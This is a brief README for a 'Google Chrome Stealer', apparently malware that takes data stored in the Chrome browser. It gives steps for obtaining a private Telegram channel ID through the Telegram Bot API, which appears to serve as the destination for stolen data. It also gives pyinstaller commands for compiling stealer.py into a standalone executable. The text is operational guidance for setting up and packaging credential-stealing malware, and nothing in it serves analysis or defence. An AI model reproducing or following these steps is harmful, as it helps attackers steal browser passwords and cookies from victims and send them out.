# Google Chrome Stealer
### To obtain private channel ID:
1. Convert it to public with some <code>@channelName</code>
2. Send test message using this URL:<br>
<code>https\://api.telegram.org/bot%TOKEN%/sendMessage?chat_id=@channelName&text=test</code>
3. As response we will get something like this:<br>
<code>{"ok": true, "result": {"chat": {"id": %CHANNEL_ID%, "title": "Test Private Channel", "type": "channel"}, "date": 1448245538, "message_id": 7, "text": "test"}}</code>
4. Now you can convert it back to private and use obtained ID

### To compile stealer:
1. Install pyinstaller using pip<br>
<code>pip install pyinstaller</code>
2. Execute following command to compile:<br>
<code>pyinstaller -F stealer.py</code>
